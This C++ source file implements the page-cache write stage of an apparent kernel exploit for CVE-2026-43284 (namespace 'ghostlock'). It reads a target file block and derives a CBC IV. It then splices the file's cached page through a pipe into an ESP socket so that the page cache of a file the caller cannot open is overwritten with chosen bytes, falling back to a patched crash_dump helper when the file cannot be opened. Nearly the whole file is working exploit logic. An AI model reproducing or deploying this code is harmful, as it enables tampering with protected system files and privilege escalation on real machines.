/* B5-3 page-cache write implementation (pagecache.hpp).
 *
 * The direct-file path of exp.c patch_file_cbc: read the old block, derive the
 * CBC IV, frame one ESP datagram into a pipe and splice that pipe to the ESP
 * socket. All syscalls go through pagecache::SpliceIoOps. */

#include "backend/cve_2026_43284/pagecache/pagecache.hpp"

#include <array>
#include <cerrno>
#include <cstddef>
#include <cstdint>
#include <limits>

namespace ghostlock::backend::cve_2026_43284 {
    namespace {
        /* SPI(4) | Seq(4) | IV(16) travel to the pipe in one vmsplice. */
        constexpr std::size_t kHeaderIvBytes = kEspHeaderBytes + kEspIvBytes;
        constexpr std::size_t kIcvScratchBytes = kEspIcvMaxBytes;

        /* Availability is derived, never stored: a usable session needs a fully
         * bound syscall surface, a connected ESP socket, a valid ICV truncation
         * length and a ciphertext page source. That source is either the direct
         * file_fd splice or, when the App cannot open the vendor file at all,
         * the injected crash_dump helper write source. */
        [[nodiscard]] bool page_cache_ready(const PageCacheWriteContext &ctx) noexcept {
            const std::size_t icv_len = static_cast<std::size_t>(ctx.sa.icv_len);
            return ctx.io.available() && ctx.socket_fd >= 0 && icv_len != 0U &&
                   icv_len <= kEspIcvMaxBytes &&
                   (ctx.file_fd >= 0 || ctx.helper_write.available());
        }

        void store_be32(std::uint8_t *out, std::uint32_t value) noexcept {
            out[0] = static_cast<std::uint8_t>((value >> 24U) & 0xffU);
            out[1] = static_cast<std::uint8_t>((value >> 16U) & 0xffU);
            out[2] = static_cast<std::uint8_t>((value >> 8U) & 0xffU);
            out[3] = static_cast<std::uint8_t>(value & 0xffU);
        }

        /* vmsplice the whole buffer. Short transfers are retried; -EINTR is
         * retried without advancing. */
        [[nodiscard]] WriteResult vmsplice_all(const pagecache::SpliceIoOps &io,
                                               int fd, const std::uint8_t *data,
                                               std::size_t len) noexcept {
            std::size_t done = 0U;
            while (done < len) {
                const std::size_t remaining = len - done;
                const long n = io.vmsplice(fd, data + done, remaining, 0U);
                if (n == -EINTR) continue;
                if (n < 0) return WriteResult::IoError;
                const std::size_t got = static_cast<std::size_t>(n);
                if (got == 0U || got > remaining) return WriteResult::ShortWrite;
                done += got;
            }
            return WriteResult::Ok;
        }

        /* Splice len bytes from in_fd at *offset into out_fd, advancing *offset
         * by the transferred count. The 16-byte target-page splice lands here. */
        [[nodiscard]] WriteResult splice_span(const pagecache::SpliceIoOps &io,
                                              int in_fd, std::uint64_t *offset,
                                              int out_fd,
                                              std::size_t len) noexcept {
            std::size_t done = 0U;
            std::uint64_t cursor = *offset;
            while (done < len) {
                const std::size_t remaining = len - done;
                const long n = io.splice(in_fd, &cursor, out_fd, nullptr, remaining, 0U);
                if (n == -EINTR) continue;
                if (n < 0) return WriteResult::IoError;
                const std::size_t got = static_cast<std::size_t>(n);
                if (got == 0U || got > remaining) return WriteResult::ShortRead;
                done += got;
                cursor += static_cast<std::uint64_t>(got);
            }
            *offset = cursor;
            return WriteResult::Ok;
        }

        /* One pipe -> socket datagram splice. A short transfer cannot be
         * appended to the same UDP datagram, so it is reported to the caller
         * rather than retried; -EINTR is retried. */
        [[nodiscard]] long splice_one_datagram(const pagecache::SpliceIoOps &io,
                                               int pipe_fd, int socket_fd,
                                               std::size_t len) noexcept {
            for (;;) {
                const long n = io.splice(pipe_fd, nullptr, socket_fd, nullptr, len, 0U);
                if (n != -EINTR) return n;
            }
        }

        void close_pair(const pagecache::SpliceIoOps &io, int fds[2]) noexcept {
            if (fds[0] >= 0) {
                (void)io.close_fd(fds[0]);
                fds[0] = -1;
            }
            if (fds[1] >= 0) {
                (void)io.close_fd(fds[1]);
                fds[1] = -1;
            }
        }

        std::int32_t file_cache_write16_adapter(void *opaque,
                                                std::uint64_t file_offset,
                                                const void *bytes16) noexcept {
            if (opaque == nullptr || bytes16 == nullptr) {
                return static_cast<std::int32_t>(WriteResult::InvalidArgument);
            }
            auto &ctx = *static_cast<PageCacheWriteContext *>(opaque);
            return static_cast<std::int32_t>(
                    write16(ctx, file_offset,
                            static_cast<const std::uint8_t *>(bytes16)));
        }
    } // namespace

    WriteResult read_block(PageCacheWriteContext &ctx, std::uint64_t file_offset,
                           std::uint8_t out[16]) noexcept {
        if (out == nullptr) return WriteResult::InvalidArgument;
        if (!page_cache_ready(ctx)) return WriteResult::NotAvailable;
        if (file_offset >
            std::numeric_limits<std::uint64_t>::max() - kPageCacheBlockBytes) {
            return WriteResult::InvalidArgument;
        }

        /* Primary source: the direct file_fd pread. Its failure is remembered
         * so an unbound old_page keeps the exact prior return code. */
        WriteResult direct = WriteResult::Ok;
        std::size_t done = 0U;
        while (done < kPageCacheBlockBytes) {
            const std::size_t remaining = kPageCacheBlockBytes - done;
            const std::uint64_t at = file_offset + static_cast<std::uint64_t>(done);
            const long n = ctx.io.read_at(ctx.file_fd, out + done, remaining, at);
            if (n == -EINTR) continue;
            if (n < 0) {
                direct = WriteResult::IoError;
                break;
            }
            const std::size_t got = static_cast<std::size_t>(n);
            if (got == 0U) {
                direct = WriteResult::ShortRead;
                break;
            }
            if (got > remaining) {
                direct = WriteResult::IoError;
                break;
            }
            done += got;
        }
        if (done == kPageCacheBlockBytes) {
            return WriteResult::Ok;
        }

        /* Vendor fallback: a direct read the App/shell cannot perform (or a
         * file it cannot open at all) is retried through the injected source.
         * The bridge is all-or-nothing: only a full 16-byte block counts, and
         * every other outcome fails the block closed so no ESP datagram is
         * emitted with a wrong IV/ICV. */
        if (ctx.old_page.available()) {
            const long n = ctx.old_page.read16(ctx.old_page.ctx, file_offset, out);
            if (n == static_cast<long>(kPageCacheBlockBytes)) {
                return WriteResult::Ok;
            }
            return n < 0 ? WriteResult::IoError : WriteResult::ShortRead;
        }
        return direct;
    }

    WriteResult write16(PageCacheWriteContext &ctx, std::uint64_t file_offset,
                        const std::uint8_t bytes16[16]) noexcept {
        if (bytes16 == nullptr) return WriteResult::InvalidArgument;
        if (!page_cache_ready(ctx)) return WriteResult::NotAvailable;
        if (file_offset >
            std::numeric_limits<std::uint64_t>::max() - kPageCacheBlockBytes) {
            return WriteResult::InvalidArgument;
        }

        std::array<std::uint8_t, kPageCacheBlockBytes> old{};
        std::array<std::uint8_t, kPageCacheBlockBytes> iv{};
        std::array<std::uint8_t, kHeaderIvBytes> header_iv{};
        std::array<std::uint8_t, kIcvScratchBytes> icv{};

        const WriteResult read_result = read_block(ctx, file_offset, old.data());
        if (read_result != WriteResult::Ok) {
            ctx.stats.blocks_failed += 1U;
            zeroize_bytes(old.data(), old.size());
            return read_result;
        }

        compute_cbc_iv(old.data(), bytes16, ctx.sa.aes_key.data(), iv.data());

        store_be32(header_iv.data() + kEspSpiOffset, ctx.sa.spi);
        store_be32(header_iv.data() + kEspSeqOffset, ctx.next_seq);
        for (std::size_t i = 0U; i < kEspIvBytes; ++i) {
            header_iv[kEspIvOffset + i] = iv[i];
        }

        const std::size_t icv_len = esp_compute_icv(
                ctx.sa, header_iv.data(), header_iv.data() + kEspHeaderBytes,
                old.data(), icv.data(), icv.size());
        if (icv_len == 0U) {
            ctx.stats.blocks_failed += 1U;
            zeroize_bytes(old.data(), old.size());
            zeroize_bytes(iv.data(), iv.size());
            zeroize_bytes(header_iv.data(), header_iv.size());
            return WriteResult::InvalidArgument;
        }

        int fds[2] = {-1, -1};
        if (ctx.io.pipe2(fds, ctx.pipe_flags) != 0) {
            ctx.stats.blocks_failed += 1U;
            zeroize_bytes(old.data(), old.size());
            zeroize_bytes(iv.data(), iv.size());
            zeroize_bytes(header_iv.data(), header_iv.size());
            zeroize_bytes(icv.data(), icv.size());
            return WriteResult::IoError;
        }

        WriteResult result = vmsplice_all(ctx.io, fds[1], header_iv.data(),
                                          header_iv.size());
        if (result == WriteResult::Ok) {
            if (ctx.file_fd >= 0) {
                std::uint64_t page_offset = file_offset;
                result = splice_span(ctx.io, ctx.file_fd, &page_offset, fds[1],
                                     kPageCacheBlockBytes);
            } else {
                /* The App cannot open the vendor file: the patched helper
                 * splice(2)s the target page into the same write pipe, behind
                 * the header/IV the parent already placed there (exp.c
                 * do_one_write_cbc use_helper=1). A short or failed helper is
                 * fail-closed: the pipe is closed without a datagram. */
                const long spliced = ctx.helper_write.splice16(
                        ctx.helper_write.ctx, fds[1], file_offset);
                if (spliced < 0) {
                    result = WriteResult::IoError;
                } else if (spliced != static_cast<long>(kPageCacheBlockBytes)) {
                    result = WriteResult::ShortWrite;
                }
            }
        }
        if (result == WriteResult::Ok) {
            result = vmsplice_all(ctx.io, fds[1], icv.data(), icv_len);
        }
        if (result == WriteResult::Ok) {
            const std::size_t total = header_iv.size() + kPageCacheBlockBytes + icv_len;
            const long sent = splice_one_datagram(ctx.io, fds[0], ctx.socket_fd, total);
            if (sent < 0) {
                result = WriteResult::IoError;
            } else if (static_cast<std::size_t>(sent) != total) {
                result = WriteResult::ShortWrite;
            }
        }

        close_pair(ctx.io, fds);

        if (result == WriteResult::Ok) {
            ctx.next_seq += 1U;
            ctx.stats.blocks_written += 1U;
            ctx.stats.datagrams_sent += 1U;
        } else {
            ctx.stats.blocks_failed += 1U;
        }

        zeroize_bytes(old.data(), old.size());
        zeroize_bytes(iv.data(), iv.size());
        zeroize_bytes(header_iv.data(), header_iv.size());
        zeroize_bytes(icv.data(), icv.size());
        return result;
    }

    WriteResult write_block(PageCacheWriteContext &ctx, std::uint64_t file_offset,
                            const std::uint8_t *bytes, std::size_t len) noexcept {
        if (len == 0U) return WriteResult::Ok;
        if (bytes == nullptr) return WriteResult::InvalidArgument;
        if ((len % kPageCacheBlockBytes) != 0U) {
            return WriteResult::InvalidArgument;
        }
        if (!page_cache_ready(ctx)) return WriteResult::NotAvailable;
        if (file_offset >
            std::numeric_limits<std::uint64_t>::max() -
                    (static_cast<std::uint64_t>(len) - 1U)) {
            return WriteResult::InvalidArgument;
        }

        const std::size_t blocks = len / kPageCacheBlockBytes;
        for (std::size_t i = 0U; i < blocks; ++i) {
            const std::uint64_t offset =
                    file_offset + static_cast<std::uint64_t>(i) * kPageCacheBlockBytes;
            const WriteResult result =
                    write16(ctx, offset, bytes + i * kPageCacheBlockBytes);
            if (result != WriteResult::Ok) {
                return i == 0U ? result : WriteResult::PartialWrite;
            }
        }
        return WriteResult::Ok;
    }

    contract::FileCacheWriteOps
    make_file_cache_write_ops(PageCacheWriteContext &ctx) noexcept {
        if (!page_cache_ready(ctx)) return contract::FileCacheWriteOps{};
        return contract::FileCacheWriteOps{&ctx, &file_cache_write16_adapter};
    }

    void zeroize(PageCacheWriteContext &ctx) noexcept { zeroize(ctx.sa); }

} // namespace ghostlock::backend::cve_2026_43284
